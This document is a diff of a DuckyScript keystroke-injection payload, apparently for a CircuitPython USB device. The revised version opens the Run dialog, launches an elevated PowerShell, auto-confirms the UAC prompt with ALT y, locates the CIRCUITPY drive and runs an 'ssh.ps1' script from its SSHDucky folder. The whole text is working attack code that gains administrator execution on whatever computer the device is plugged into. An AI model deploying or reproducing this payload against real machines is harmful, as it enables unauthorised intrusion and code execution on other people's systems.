@@ -1,24 +1,19 @@
-REM PowerShell Admin Ducky Script
+
+REM Open Powershell In Admin Mode
 DELAY 5000
-REM Press Windows key to open the Start menu
-GUI
+GUI r
 DELAY 500
-REM Type "powershell" to search for PowerShell
 STRING powershell
-DELAY 500
-REM Press Enter to select the PowerShell application
-RIGHTARROW
-DELAY 500
-DOWNARROW
-DELAY 500
+ENTER
+DELAY 1000
+STRING start-process powershell -verb runas ; exit
 ENTER
 DELAY 1000
 LEFTARROW
-DELAY 1000
 ENTER
-REM Press Alt+Y to allow execution of the script (UAC prompt)
 ALT y
-DELAY 500
+DELAY 500 
+
 
 REM Get the drive letter of CIRCUITPY and store it in a variable
 STRING $driveLetter = (Get-Volume | Where-Object { $_.FileSystemLabel -eq "CIRCUITPY" }).DriveLetter
@@ -27,10 +22,9 @@ DELAY 1000
 STRING $path = "$driveLetter" + ":" + "\SSHDucky"
 ENTER
 DELAY 100
-
 STRING cd $path
 ENTER
 
-STRING .\ssh.ps1
+STRING .\ssh.ps1 ; exit
 ENTER
 DELAY 5000
